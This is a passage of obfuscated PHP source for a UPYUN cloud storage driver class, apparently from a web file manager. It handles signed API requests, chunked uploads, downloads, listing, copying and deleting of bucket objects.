$Ê√±ò®ñ = new PathDriverStream($âÍ•˙™˝, $¸‚õ‰¥Ñ); return $Ê√±ò®ñ->hashMd5($âÍ•˙™˝); } } class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\150\x74\164\x70\72\57\x2f\x76\60\56\x61\x70\151\56\165\160\x79\165\x6e\x2e\x63\157\155"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($É©ê˙ô–) { parent::__construct(); $this->_init($É©ê˙ô–); } public function _init($†˙±£Àœ) { $à≤Â⁄™í =& $_SERVER[ˆë€Ï⁄∂]; foreach ($†˙±£Àœ as $∑Å¸Òÿ• => $ò˘ü¥∆≈) { if (isset($this->{$∑Å¸Òÿ•})) { $this->{$∑Å¸Òÿ•} = $ò˘ü¥∆≈; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($à≤Â⁄™í[1561] . LNG($à≤Â⁄™í[1480])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($ñ˛Øπ·±, $Ë˝‚√¨ = "\x47\x45\124") { $è…Ö∆á€ =& $_SERVER[ˆë€Ï⁄∂]; $·Åß˜ ï = gmdate($è…Ö∆á€[1509]); $ªŒê˝ˆª = base64_encode(hash_hmac($è…Ö∆á€[1562], "{$Ë˝‚√¨}\46{$ñ˛Øπ·±}\x26{$·Åß˜ ï}", md5("{$this->userpass}"), !0)); $ß©Ôçêö = array("\101\165\164\150\157\x72\x69\x7a\x61\x74\x69\157\x6e\x3a\125\120\x59\x55\x4e\x20{$this->username}\x3a{$ªŒê˝ˆª}", "\104\x61\164\x65\72{$·Åß˜ ï}"); return $ß©Ôçêö; } public function ussRequest($±‡»â¨Ü, $ı»Ω‰™≠ = "\x47\105\124", $ô´◊¥Ùü = false, $¬“Œ‘„‘ = false, $∏Â˝“÷∑ = false) { $°˝˜¿Ë√ =& $_SERVER[ˆë€Ï⁄∂]; $±‡»â¨Ü = trim($±‡»â¨Ü, $°˝˜¿Ë√[8]); $ﬂ‚§º‡Á = "\57{$this->bucket}\57" . rawurlencode($±‡»â¨Ü); $ÓÌ…ÑÓ◊ = $this->ussHeaders($ﬂ‚§º‡Á, $ı»Ω‰™≠); if ($¬“Œ‘„‘) { $ÓÌ…ÑÓ◊ = array_merge($ÓÌ…ÑÓ◊, $¬“Œ‘„‘); } $„…â˛Ÿ = url_request($this->endpoint . $ﬂ‚§º‡Á, $ı»Ω‰™≠, $ô´◊¥Ùü, $ÓÌ…ÑÓ◊, $∏Â˝“÷∑); if (!$„…â˛Ÿ) { $ÅÅÔúΩ« = LNG($°˝˜¿Ë√[1563]); $this->writeLog($ÅÅÔúΩ«); return array($°˝˜¿Ë√[1312] => !1, $°˝˜¿Ë√[1302] => $ÅÅÔúΩ«); } if (strtolower($ı»Ω‰™≠) == $°˝˜¿Ë√[239] || in_array($„…â˛Ÿ[$°˝˜¿Ë√[1312]], array($°˝˜¿Ë√[273], $°˝˜¿Ë√[1564]))) { $ô´◊¥Ùü = $„…â˛Ÿ[$°˝˜¿Ë√[1565]]; if (!$„…â˛Ÿ[$°˝˜¿Ë√[841]]) { $ô´◊¥Ùü = isset($ô´◊¥Ùü[0]) ? $ô´◊¥Ùü[0] : $°˝˜¿Ë√[12]; } } else { $ô´◊¥Ùü = json_decode($„…â˛Ÿ[$°˝˜¿Ë√[1302]], !0); if (!$ô´◊¥Ùü) { $ô´◊¥Ùü = $„…â˛Ÿ[$°˝˜¿Ë√[1302]]; } else { if (!$„…â˛Ÿ[$°˝˜¿Ë√[841]] && isset($ô´◊¥Ùü[$°˝˜¿Ë√[1566]])) { $ô´◊¥Ùü = $ô´◊¥Ùü[$°˝˜¿Ë√[1566]]; } } } if (!$„…â˛Ÿ[$°˝˜¿Ë√[841]]) { $this->writeLog($this->__errorMessage($ô´◊¥Ùü)); } return array($°˝˜¿Ë√[1312] => $„…â˛Ÿ[$°˝˜¿Ë√[841]], $°˝˜¿Ë√[1302] => $ô´◊¥Ùü); } private function __errorMessage($¿¨›‚¸Ñ) { $ëÉ›’Ì° =& $_SERVER[ˆë€Ï⁄∂]; if (!$¿¨›‚¸Ñ) { return $ëÉ›’Ì°[12]; } static $éªÌ–ï = null; if (!$éªÌ–ï) { $éªÌ–ï = I18n::getType(); } if ($éªÌ–ï != $ëÉ›’Ì°[1519]) { return $¿¨›‚¸Ñ; } $‹ÛŸ˘ÇÄ = array($ëÉ›’Ì°[1567] => $ëÉ›’Ì°[1568], $ëÉ›’Ì°[1569] => $ëÉ›’Ì°[1570], $ëÉ›’Ì°[1571] => $ëÉ›’Ì°[1570], $ëÉ›’Ì°[1572] => $ëÉ›’Ì°[1573], $ëÉ›’Ì°[1574] => $ëÉ›’Ì°[1575], $ëÉ›’Ì°[1576] => $ëÉ›’Ì°[1577], $ëÉ›’Ì°[1578] => $ëÉ›’Ì°[1579]); return isset($‹ÛŸ˘ÇÄ[$¿¨›‚¸Ñ]) ? $‹ÛŸ˘ÇÄ[$¿¨›‚¸Ñ] : $¿¨›‚¸Ñ; } public function mkfile($ÔÖÍû®‰, $˝Æ≥ñß‰ = '', $¥Ñ—¡Ë˘ = REPEAT_RENAME) { if ($this->setContent($ÔÖÍû®‰, $˝Æ≥ñß‰)) { return $this->getPathOuter($ÔÖÍû®‰); } return !1; } public function mkdir($Ø»òÙ¸≥, $Ùêñ∞ôå = REPEAT_SKIP) { $ˆŸ≈€º˘ =& $_SERVER[ˆë€Ï⁄∂]; $ØÓèÿì¢ = trim($Ø»òÙ¸≥, $ˆŸ≈€º˘[8]); if ($this->_isFolder($ØÓèÿì¢)) { return $this->getPathOuter($ØÓèÿì¢); } $§“ºŸˆÑ = array($ˆŸ≈€º˘[1580]); $⁄à∫”ã¥ = $this->ussRequest($ØÓèÿì¢, $ˆŸ≈€º˘[299], !1, $§“ºŸˆÑ); return $⁄à∫”ã¥[$ˆŸ≈€º˘[1312]] ? $this->getPathOuter($ØÓèÿì¢) : !1; } public function copyFile($Œ¸ı«ê„, $…ò®ª˙ü) { $˜ü¯Ü®ÿ =& $_SERVER[ˆë€Ï⁄∂]; $îÈ©‹π“ = array($˜ü¯Ü®ÿ[1581] . "\57{$this->bucket}\57{$Œ¸ı«ê„}", $˜ü¯Ü®ÿ[1582]); $“ã†Á—Î = $this->ussRequest($…ò®ª˙ü, $˜ü¯Ü®ÿ[265], !1, $îÈ©‹π“); return $“ã†Á—Î[$˜ü¯Ü®ÿ[1312]] ? !0 : $this->getPathOuter($…ò®ª˙ü); } public function moveFile($€Ÿâéï¥, $ ¯¯â»∞) { $¿ƒ‘∞Î„ =& $_SERVER[ˆë€Ï⁄∂]; $°ùøÙ‚Ü = array($¿ƒ‘∞Î„[1583] . "\57{$this->bucket}\x2f{$€Ÿâéï¥}", $¿ƒ‘∞Î„[1582]); $¢Ë¸øå© = $this->ussRequest($ ¯¯â»∞, $¿ƒ‘∞Î„[265], !1, $°ùøÙ‚Ü); return $¢Ë¸øå©[$¿ƒ‘∞Î„[1312]] ? !0 : $this->getPathOuter($ ¯¯â»∞); } public function delFile($¯µâÖ©Á) { $Ω›˚¿ﬁ§ =& $_SERVER[ˆë€Ï⁄∂]; $˙õ‘Å‘ƒ = $this->ussRequest($¯µâÖ©Á, $Ω›˚¿ﬁ§[1584]); return $˙õ‘Å‘ƒ[$Ω›˚¿ﬁ§[1312]] ? !0 : !1; } public function delFolder($˚»ﬂªë™) { $Á‰ªÑÍ =& $_SERVER[ˆë€Ï⁄∂]; if (!$this->exist($˚»ﬂªë™)) { return !0; } $this->listItemCache = !1; $∆Öæâ∏¥ = $¥çî¯¯ì = array(); $this->fileList($˚»ﬂªë™, $∆Öæâ∏¥, $¥çî¯¯ì, !0); $this->listItemCache = !0; foreach ($¥çî¯¯ì as $–ùê≠¥à) { $Ûˆ¬ÌÀø = $this->ussRequest($–ùê≠¥à[$Á‰ªÑÍ[32]], $Á‰ªÑÍ[1584]); if (!$Ûˆ¬ÌÀø[$Á‰ªÑÍ[1312]]) { return !1; } } usort($∆Öæâ∏¥, function ($Ÿöµ¶ı‘, $òªî∆•ˆ) { $üÕñˆ” =& $_SERVER[ˆë€Ï⁄∂]; return substr_count($òªî∆•ˆ, $üÕñˆ”[8]) - substr_count($Ÿöµ¶ı‘, $üÕñˆ”[8]); }); foreach ($∆Öæâ∏¥ as $Ò◊ªòçù) { $Ûˆ¬ÌÀø = $this->ussRequest($Ò◊ªòçù, $Á‰ªÑÍ[1584]); if (!$Ûˆ¬ÌÀø[$Á‰ªÑÍ[1312]]) { return !1; } } $Ûˆ¬ÌÀø = $this->ussRequest($˚»ﬂªë™, $Á‰ªÑÍ[1584]); return $Ûˆ¬ÌÀø[$Á‰ªÑÍ[1312]]; } public function rename($ß•â—∆Ω, $à øÚ‡) { if ($this->isFile($ß•â—∆Ω)) { $à øÚ‡ = get_path_father($ß•â—∆Ω) . $à øÚ‡; return $this->moveFile($ß•â—∆Ω, $à øÚ‡); } return $this->renameObject($ß•â—∆Ω, $à øÚ‡); } public function fileInfo($˝≤Ωπ˜€, $ÍàÖ‰·¨ = false, $ÄÏËëëπ = array()) { $åÅπ¨ÍÂ =& $_SERVER[ˆë€Ï⁄∂]; $Í◊ﬂ∞√í = array($åÅπ¨ÍÂ[32] => $this->pathThis($˝≤Ωπ˜€), $åÅπ¨ÍÂ[97] => $this->getPathOuter($åÅπ¨ÍÂ[8] . $˝≤Ωπ˜€), $åÅπ¨ÍÂ[33] => $åÅπ¨ÍÂ[242], $åÅπ¨ÍÂ[89] => isset($ÄÏËëëπ[$åÅπ¨ÍÂ[89]]) ? $ÄÏËëëπ[$åÅπ¨ÍÂ[89]] : 0, $åÅπ¨ÍÂ[179] => $this->ext($˝≤Ωπ˜€)); if ($ÍàÖ‰·¨) { return $Í◊ﬂ∞√í; } $Í◊ﬂ∞√í[$åÅπ¨ÍÂ[243]] = $Í◊ﬂ∞√í[$åÅπ¨ÍÂ[98]] = 0; $Í◊ﬂ∞√í[$åÅπ¨ÍÂ[244]] = $Í◊ﬂ∞√í[$åÅπ¨ÍÂ[245]] = !0; if (empty($ÄÏËëëπ)) { $ÄÏËëëπ = $this->objectMeta($˝≤Ωπ˜€); if (!$ÄÏËëëπ) { return $Í◊ﬂ∞√í; } } $Í◊ﬂ∞√í[$åÅπ¨ÍÂ[243]] = intval($ÄÏËëëπ[$åÅπ¨ÍÂ[1585]]); $Í◊ﬂ∞√í[$åÅπ¨ÍÂ[98]] = intval($ÄÏËëëπ[$åÅπ¨ÍÂ[1586]]); $Í◊ﬂ∞√í[$åÅπ¨ÍÂ[89]] = $ÄÏËëëπ[$åÅπ¨ÍÂ[89]]; return $Í◊ﬂ∞√í; } public function folderInfo($äé¿˚èÿ, $ œê˝‚Ä = false) { $˚Ωê’’ =& $_SERVER[ˆë€Ï⁄∂]; $íØÅ•ñû = array($˚Ωê’’[32] => $this->pathThis($äé¿˚èÿ), $˚Ωê’’[97] => $this->getPathOuter($˚Ωê’’[8] . $äé¿˚èÿ), $˚Ωê’’[33] => $˚Ωê’’[88]); if ($ œê˝‚Ä) { return $íØÅ•ñû; } $íØÅ•ñû[$˚Ωê’’[243]] = $íØÅ•ñû[$˚Ωê’’[98]] = 0; $íØÅ•ñû[$˚Ωê’’[244]] = $íØÅ•ñû[$˚Ωê’’[245]] = !0; if (empty($áﬂÂ´¶Ú)) { $áﬂÂ´¶Ú = $this->objectMeta($äé¿˚èÿ); if (!$áﬂÂ´¶Ú) { return $íØÅ•ñû; } } $íØÅ•ñû[$˚Ωê’’[243]] = intval($áﬂÂ´¶Ú[$˚Ωê’’[1585]]); $íØÅ•ñû[$˚Ωê’’[98]] = intval($áﬂÂ´¶Ú[$˚Ωê’’[1586]]); return $íØÅ•ñû; } private function listObjs($ÿÈ∞¸˚∆, $À¸•‚úÂ = 0, $∫îÖÌ˝Ü = 1000) { $ÙÁØõπ =& $_SERVER[ˆë€Ï⁄∂]; $õÉÉ≠ìæ = array($ÙÁØõπ[1587], $ÙÁØõπ[1588] . $∫îÖÌ˝Ü); if ($À¸•‚úÂ) { $õÉÉ≠ìæ[] = $ÙÁØõπ[1589] . $À¸•‚úÂ; } $ç°Éô¸¿ = $this->ussRequest($ÿÈ∞¸˚∆, $ÙÁØõπ[1511], !1, $õÉÉ≠ìæ); return !$ç°Éô¸¿[$ÙÁØõπ[1312]] ? !1 : $ç°Éô¸¿[$ÙÁØõπ[1302]]; } private function fileList($¬ÿÍÔõÁ, &$ØéÒ€úı, &$˛µıö¢ª, $Ø˙Å·Å = false) { $È°≈›ÿ =& $_SERVER[ˆë€Ï⁄∂]; $“‡øÖ±§ = $È°≈›ÿ[12]; $£Â¯ÂÿÒ = 1000; $Á—∂Ç≈Á = rtrim($¬ÿÍÔõÁ, $È°≈›ÿ[8]) . $È°≈›ÿ[8]; while (!0) { check_abort(); $’ÂÚ•Õù = $this->listObjs($¬ÿÍÔõÁ, $“‡øÖ±§, $£Â¯ÂÿÒ); if (!$’ÂÚ•Õù) { return !1; } $“‡øÖ±§ = isset($’ÂÚ•Õù[$È°≈›ÿ[1590]]) ? $’ÂÚ•Õù[$È°≈›ÿ[1590]] : $È°≈›ÿ[12]; $π©˘à‡À = isset($’ÂÚ•Õù[$È°≈›ÿ[1591]]) ? $’ÂÚ•Õù[$È°≈›ÿ[1591]] : array(); foreach ($π©˘à‡À as $®å÷ä©ê) { $⁄Ê¡€¥é = $®å÷ä©ê[$È°≈›ÿ[33]] == $È°≈›ÿ[88] ? !0 : !1; $Äò«ÀÃ≠ = ltrim($Á—∂Ç≈Á . $®å÷ä©ê[$È°≈›ÿ[32]], $È°≈›ÿ[8]) . ($⁄Ê¡€¥é ? $È°≈›ÿ[8] : $È°≈›ÿ[12]); $˛‡⁄âÌ¯ = array($È°≈›ÿ[32] => $Äò«ÀÃ≠, $È°≈›ÿ[33] => $⁄Ê¡€¥é ? $È°≈›ÿ[88] : $È°≈›ÿ[242], $È°≈›ÿ[89] => $®å÷ä©ê[$È°≈›ÿ[423]], $È°≈›ÿ[1586] => $®å÷ä©ê[$È°≈›ÿ[1592]]); $this->cacheMethodInfoSet($Äò«ÀÃ≠, $⁄Ê¡€¥é, $˛‡⁄âÌ¯); if ($⁄Ê¡€¥é) { $ØéÒ€úı[] = $Äò«ÀÃ≠; if ($Ø˙Å·Å) { $this->fileList($Äò«ÀÃ≠, $ØéÒ€úı, $˛µıö¢ª, $Ø˙Å·Å); } continue; } $˛µıö¢ª[] = $˛‡⁄âÌ¯; } if (count($π©˘à‡À) < $£Â¯ÂÿÒ) { break; } } $this->cacheMethodInfoSet($¬ÿÍÔõÁ, !0); } public function listPath($Ú¡Ωµ”ê, $Î∆å⁄‡» = false) { $Æ¢ø””‡ =& $_SERVER[ˆë€Ï⁄∂]; $Ì¸·´â… = $ŸˆÃìöÒ = array(); $this->fileList($Ú¡Ωµ”ê, $Ì¸·´â…, $ŸˆÃìöÒ); foreach ($Ì¸·´â… as $ı»†Ô· => $¯˝¡ëÒ‰) { $Ì¸·´â…[$ı»†Ô·] = $this->folderInfo($¯˝¡ëÒ‰, $Î∆å⁄‡»); } foreach ($ŸˆÃìöÒ as $ı»†Ô· => $¯˝¡ëÒ‰) { $ŸˆÃìöÒ[$ı»†Ô·] = $this->fileInfo($¯˝¡ëÒ‰[$Æ¢ø””‡[32]], $Î∆å⁄‡», $¯˝¡ëÒ‰); } return array($Æ¢ø””‡[95] => $Ì¸·´â…, $Æ¢ø””‡[96] => $ŸˆÃìöÒ); } public function has($œ∫˙≥Œ, $è¶∑ïÜ£ = false, $ˆÂÃª…Ï = true) { $Èî⁄˙˙˝ =& $_SERVER[ˆë€Ï⁄∂]; $è∫˙ô™√ = $Èî⁄˙˙˝[12]; $∆ﬂÙè—± = 500; $’ÈÏ≥˘ª = 0; $àììîƒ€ = 0; $≥“Ü€Ü˚ = rtrim($œ∫˙≥Œ, $Èî⁄˙˙˝[8]) . $Èî⁄˙˙˝[8]; while (!0) { check_abort(); $…∏·éﬂî = $this->listObjs($œ∫˙≥Œ, $è∫˙ô™√, $∆ﬂÙè—±); if (!$…∏·éﬂî) { return !1; } $è∫˙ô™√ = isset($…∏·éﬂî[$Èî⁄˙˙˝[1590]]) ? $…∏·éﬂî[$Èî⁄˙˙˝[1590]] : $Èî⁄˙˙˝[12]; $ºçâ·ûƒ = isset($…∏·éﬂî[$Èî⁄˙˙˝[1591]]) ? $…∏·éﬂî[$Èî⁄˙˙˝[1591]] : array(); if (empty($ºçâ·ûƒ)) { break; } $¬å’üï° = array_filter($ºçâ·ûƒ, function ($íà¨Õ™†) { $Ç’ì‹ÇΩ =& $_SERVER[ˆë€Ï⁄∂]; return $íà¨Õ™†[$Ç’ì‹ÇΩ[33]] == $Ç’ì‹ÇΩ[88]; }); $±¶Û„àÒ = count($ºçâ·ûƒ); $¬å’üï° = count($¬å’üï°); $ÇüÑŒê“ = $±¶Û„àÒ - $¬å’üï°; if ($è¶∑ïÜ£) { $àììîƒ€ += $¬å’üï°; $’ÈÏ≥˘ª += $ÇüÑŒê“; if ($±¶Û„àÒ < $∆ﬂÙè—±) { break; } continue; } if ($ˆÂÃª…Ï) { if ($ÇüÑŒê“) { return !0; } } else { if ($¬å’üï°) { return !0; } } if ($±¶Û„àÒ < $∆ﬂÙè—±) { break; } } if ($è¶∑ïÜ£) { return array($Èî⁄˙˙˝[251] => $’ÈÏ≥˘ª, $Èî⁄˙˙˝[252] => $àììîƒ€); } return !1; } public function listAll($⁄⁄ıµó∫) { $ä√Óà˛ﬁ =& $_SERVER[ˆë€Ï⁄∂]; $˝µø‰µ¢ = $˘ë≈≠†√ = array(); $this->fileList($⁄⁄ıµó∫, $˝µø‰µ¢, $˘ë≈≠†√, !0); $Ì°ñàµ‚ = array_to_keyvalue($˘ë≈≠†√, $ä√Óà˛ﬁ[32]); foreach ($˝µø‰µ¢ as $¯†·ú…§) { if (is_string($¯†·ú…§)) { $Ì°ñàµ‚[$¯†·ú…§] = array($ä√Óà˛ﬁ[89] => 0); } } return $this->listAllFiles($⁄⁄ıµó∫, $Ì°ñàµ‚); } public function canRead($ù÷¯´ÿœ) { return $this->exist($ù÷¯´ÿœ) ? !0 : !1; } public function canWrite($˝Õ¡˝‹Ò) { return $this->exist($˝Õ¡˝‹Ò) ? !0 : !1; } public function getContent($±—íóòº) { return $this->fileSubstr($±—íóòº, 0, -1); } public function setContent($∂ë‘†’Á, $”˛¬Íí® = '') { $Ï·Ô©º— =& $_SERVER[ˆë€Ï⁄∂]; if (!$”˛¬Íí®) { $Ã¬ı°·∞ = $this->ussRequest($∂ë‘†’Á, $Ï·Ô©º—[299]); return $Ã¬ı°·∞[$Ï·Ô©º—[1312]]; } $Ù“»´à“ = $this->tempFile($this->pathThis($∂ë‘†’Á)); file_put_contents($Ù“»´à“, $”˛¬Íí®); if ($this->upload($∂ë‘†’Á, $Ù“»´à“)) { $this->tempFileRemve($Ù“»´à“); return !0; } return !1; } public function fileSubstr($∫”‚¿¿è, $Ì◊—≈Õ√, $’¯πúÄ∂) { $äø ∂Ù˙ =& $_SERVER[ˆë€Ï⁄∂]; if (!($∂”øÈÃÚ = $this->link($∫”‚¿¿è))) { return !1; } $ÑÉ÷ûèÍ = !1; if ($’¯πúÄ∂ > 0) { $ö›ëÀ¯Ô = $Ì◊—≈Õ√ + $’¯πúÄ∂ - 1; $ÑÉ÷ûèÍ = array($äø ∂Ù˙[1551] . $Ì◊—≈Õ√ . $äø ∂Ù˙[473] . $ö›ëÀ¯Ô); } $∆Ÿ∞˚Ø„ = url_request($∂”øÈÃÚ, $äø ∂Ù˙[1511], !1, $ÑÉ÷ûèÍ); return $∆Ÿ∞˚Ø„[$äø ∂Ù˙[841]] ? $∆Ÿ∞˚Ø„[$äø ∂Ù˙[1302]] : !1; } public function upload($ÊïÅ≤éÎ, $®ﬂëïãÄ, $«ƒÍÏÆÉ = false, $ÿæ…ïŸ¢ = REPEAT_REPLACE) { $†∑’âªÎ =& $_SERVER[ˆë€Ï⁄∂]; $„◊ûå˝ë = IO::size($®ﬂëïãÄ); if ($„◊ûå˝ë <= 1024 * 1024 * 200) { $®ö≈Œ¿≤ = array($†∑’âªÎ[1593] . $®ﬂëïãÄ); $èñ®Ê¸ = $this->ussRequest($ÊïÅ≤éÎ, $†∑’âªÎ[265], $®ö≈Œ¿≤); return $èñ®Ê¸[$†∑’âªÎ[1312]] ? $this->getPathOuter($ÊïÅ≤éÎ) : !1; } $ì¥‚ÄÇÀ = 1024 * 1024 * 10; $æÑéΩ»Å = array($†∑’âªÎ[1594], $†∑’âªÎ[1595] . $„◊ûå˝ë, $†∑’âªÎ[1596], $†∑’âªÎ[1597] . $ì¥‚ÄÇÀ); $èñ®Ê¸ = $this->ussRequest($ÊïÅ≤éÎ, $†∑’âªÎ[265], !1, $æÑéΩ»Å); if (!$èñ®Ê¸[$†∑’âªÎ[1312]]) { return !1; } $ô°∫∑ùœ = $èñ®Ê¸[$†∑’âªÎ[1302]]; $±ë´√—‰ = 0; $ÃÛÈ‚¿˜ = $ô°∫∑ùœ[$†∑’âªÎ[1598]]; $é∫êßÖû = fopen($®ﬂëïãÄ, $†∑’âªÎ[1474]); if (!$é∫êßÖû) { return !1; } do { $˙Á£¸øÉ = $ô°∫∑ùœ[$†∑’âªÎ[1599]]; fseek_64($é∫êßÖû, $±ë´√—‰); $†˝⁄¯ë‹ = fread($é∫êßÖû, $˙Á£¸øÉ); $Ï“îÌƒÔ = 0; do { $Ï“îÌƒÔ++; $ô°∫∑ùœ = $this->uploadPart($ÊïÅ≤éÎ, $ô°∫∑ùœ, $†˝⁄¯ë‹); } while (!$ô°∫∑ùœ && $Ï“îÌƒÔ < 3); if (!$ô°∫∑ùœ) { return !1; } $ÃÛÈ‚¿˜ = $ô°∫∑ùœ[$†∑’âªÎ[1598]]; $±ë´√—‰ += $˙Á£¸øÉ; } while ($ÃÛÈ‚¿˜ != -1); fclose($é∫êßÖû); $æÑéΩ»Å = array($†∑’âªÎ[1600], $†∑’âªÎ[1601] . $ô°∫∑ùœ[$†∑’âªÎ[1602]], $†∑’âªÎ[1596]); $èñ®Ê¸ = $this->ussRequest($ÊïÅ≤éÎ, $†∑’âªÎ[265], !1, $æÑéΩ»Å); return $èñ®Ê¸[$†∑’âªÎ[1312]] ? $this->getPathOuter($≤ï…¥Ÿù) : !1; } private function uploadPart($π◊´◊¡‚, $«ˆ˛⁄œﬂ, &$ÛáÍ¨˚Ë) { $Îíä±˛◊ =& $_SERVER[ˆë€Ï⁄∂]; $“ÓèÍàë = array($Îíä±˛◊[1603], $Îíä±˛◊[1601] . $«ˆ˛⁄œﬂ[$Îíä±˛◊[1602]], $Îíä±˛◊[1604] . $«ˆ˛⁄œﬂ[$Îíä±˛◊[1598]], $Îíä±˛◊[156] . $«ˆ˛⁄œﬂ[$Îíä±˛◊[1599]]); $ÓïòÊ¿‚ = $this->ussRequest($π◊´◊¡‚, $Îíä±˛◊[265], $ÛáÍ¨˚Ë, $“ÓèÍàë); return !$ÓïòÊ¿‚[$Îíä±˛◊[1312]] ? $ÓïòÊ¿‚[$Îíä±˛◊[1312]] : $ÓïòÊ¿‚[$Îíä±˛◊[1302]]; } public function uploadFormData($Â∫Áñ∂Î, $±À˜ß–µ = 3600) { return $this->uploadPolicy($Â∫Áñ∂Î, $±À˜ß–µ); } public function uploadMultiData($—¸ÃÄÉﬂ, $Ω˘ëÿ≥À = 3600) { $…Í˙Àß⁄ =& $_SERVER[ˆë€Ï⁄∂]; $¯ÕŸœâæ = (int) $GLOBALS[$…Í˙Àß⁄[7]][$…Í˙Àß⁄[89]]; return $this->uploadPolicy($—¸ÃÄÉﬂ, $Ω˘ëÿ≥À, $¯ÕŸœâæ); } private function uploadPolicy($çøÏó√ú, $πÃã‹õä = 3600, $¯â «ªΩ = 0) { $¢∞™ƒﬂÑ =& $_SERVER[ˆë€Ï⁄∂]; $∫çËππå = $¢∞™ƒﬂÑ[8] . $this->bucket; $Ñ ùÍ®∫ = gmdate($¢∞™ƒﬂÑ[1509]); $≠·Æ∏èÛ = array($¢∞™ƒﬂÑ[1605] => $this->bucket, $¢∞™ƒﬂÑ[1606] => $çøÏó√ú, $¢∞™ƒﬂÑ[1607] => time() + $πÃã‹õä, $¢∞™ƒﬂÑ[1608] => $Ñ ùÍ®∫); if ($¯â «ªΩ) { $≠·Æ∏èÛ[$¢∞™ƒﬂÑ[1494]] = $¯â «ªΩ; } $•´æ≥ﬂÏ = base64_encode(json_encode($≠·Æ∏èÛ)); $π≈ãòπ· = base64_encode(hash_hmac($¢∞™ƒﬂÑ[1562], "\x50\117\123\124\x26{$∫çËππå}\46{$Ñ ùÍ®∫}\46{$•´æ≥ﬂÏ}", md5("{$this->userpass}"), !0)); $áó˚‚æÑ = array($¢∞™ƒﬂÑ[289] => $•´æ≥ﬂÏ, $¢∞™ƒﬂÑ[1609] => "\x55\120\x59\x55\116\40{$this->username}\x3a{$π≈ãòπ·}", $¢∞™ƒﬂÑ[218] => $this->endpoint . $∫çËππå); return $áó˚‚æÑ; } public function download($∆∑ƒ¢óø, $˜è˛§µö) { $÷»…¥Ï£ = IO::getPathInner(IO::mkfile($˜è˛§µö)); if (!($Í ˜∂Œì = $this->link($∆∑ƒ¢óø))) { return !1; } $”ñâ„¿û = 0; $àﬂ‡È‹¢ = 1024 * 200; $Ÿ„·µÇ˝ = fopen($÷»…¥Ï£, $_SERVER[ˆë€Ï⁄∂][1557]); while (!0) { $á ’ûâÈ = $this->fileSubstr($∆∑ƒ¢óø, $”ñâ„¿û, $àﬂ‡È‹¢); if ($á ’ûâÈ === !1) { return !1; } fwrite($Ÿ„·µÇ˝, $á ’ûâÈ); $”ñâ„¿û += $àﬂ‡È‹¢; if (strlen($á ’ûâÈ) < $àﬂ‡È‹¢) { break; } } fclose($Ÿ„·µÇ˝); return $˜è˛§µö; } public function link($®œ¸¥ËŒ, $¬ü Ö≥π = array()) { $√Á¯ÆÉ∆ =& $_SERVER[ˆë€Ï⁄∂]; $®œ¸¥ËŒ = trim($®œ¸¥ËŒ, $√Á¯ÆÉ∆[8]); if (!empty($this->token)) { $é¡Ïˆø© = strtotime(date($√Á¯ÆÉ∆[1610])); $Ûπ¥“àé = substr(md5($this->token . $√Á¯ÆÉ∆[296] . $é¡Ïˆø© . $√Á¯ÆÉ∆[1611] . $®œ¸¥ËŒ), 12, 8) . $é¡Ïˆø©; $¬ü Ö≥π[] = $√Á¯ÆÉ∆[1612] . $Ûπ¥“àé; } $ü≤∑ú‘ù = !empty($¬ü Ö≥π) ? $√Á¯ÆÉ∆[86] . implode($√Á¯ÆÉ∆[296], $¬ü Ö≥π) : $√Á¯ÆÉ∆[12]; return $this->getHost() . $√Á¯ÆÉ∆[8] . $this->pathEncode($®œ¸¥ËŒ) . $ü≤∑ú‘ù; } public function fileOut($ªí¡˜ÂÆ, $ïàßø±© = false, $¬ÙÒÛªû = false, $‹ﬂñ“◊¡ = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($ªí¡˜ÂÆ, $ïàßø±©, $¬ÙÒÛªû, $‹ﬂñ“◊¡); } if (!$¬ÙÒÛªû) { $¬ÙÒÛªû = $this->pathThis($ªí¡˜ÂÆ); } $ÙÿÏ˙∫» = $ïàßø±© ? array($_SERVER[ˆë€Ï⁄∂][1613] . rawurlencode($¬ÙÒÛªû)) : array(); $ÆÖîÖ˘Ò = $this->link($ªí¡˜ÂÆ, $ÙÿÏ˙∫»); $this->fileOutLink($ÆÖîÖ˘Ò); } public function fileOutServer($Ö∆ à‚ì, $Ç§˝ﬂ€· = false, $àŒïùÿ√ = false, $Ù––ìôô = '') { parent::fileOut($Ö∆ à‚ì, $Ç§˝ﬂ€·, $àŒïùÿ√, $Ù––ìôô); } public function fileOutImage($•ÚÜÀ⁄¢, $üÛÿ÷Ø∫ = 250) { $∫ó˙ÿáﬁ = $this->link($•ÚÜÀ⁄¢ . $_SERVER[ˆë€Ï⁄∂][1614] . $üÛÿ÷Ø∫); $this->fileOutLink($∫ó˙ÿáﬁ); } public function fileOutImageServer($Æ˘Ùµ…‰, $Ê∂˛™·ò = 250) { parent::fileOutImage($Æ˘Ùµ…‰, $Ê∂˛™·ò); } public function hashMd5($Òﬁ¢Éÿ÷) { $’ªÖÌ˘ä =& $_SERVER[ˆë€Ï⁄∂]; $î∏ üàÉ = $this->_objectMeta($Òﬁ¢Éÿ÷); return isset($î∏ üàÉ[$’ªÖÌ˘ä[257]]) ? $î∏ üàÉ[$’ªÖÌ˘ä[257]] : !1; } public function size($¿•ƒ√åê) { $ä∫Õ—ê∆ = $this->objectMeta($¿•ƒ√åê); return $ä∫Õ—ê∆ ? $ä∫Õ—ê∆[$_SERVER[ˆë€Ï⁄∂][89]] : 0; } public function info($“é∆ê¯∆) { if ($this->isFolder($“é∆ê¯∆)) { return $this->folderInfo($“é∆ê¯∆); } else { if ($this->isFile($“é∆ê¯∆)) { return $this->fileInfo($“é∆ê¯∆); } } return !1; } public function exist($‰ç«˚è¨) { return $this->isFile($‰ç«˚è¨) || $this->isFolder($‰ç«˚è¨); } public function isFile($∂Ùﬁõû∞) { return !$this->isFolder($∂Ùﬁõû∞) && $this->objectMeta($∂Ùﬁõû∞); } public function isFolder($í°∫ﬁ°“) { return $this->cacheMethod($_SERVER[ˆë€Ï⁄∂][189], $í°∫ﬁ°“); } protected function objectMeta($ﬁ¶„¡‡≤) { return $this->cacheMethod($_SERVER[ˆë€Ï⁄∂][191], $ﬁ¶„¡‡≤); } protected function _objectMeta($⁄Ù—›ö∫) { 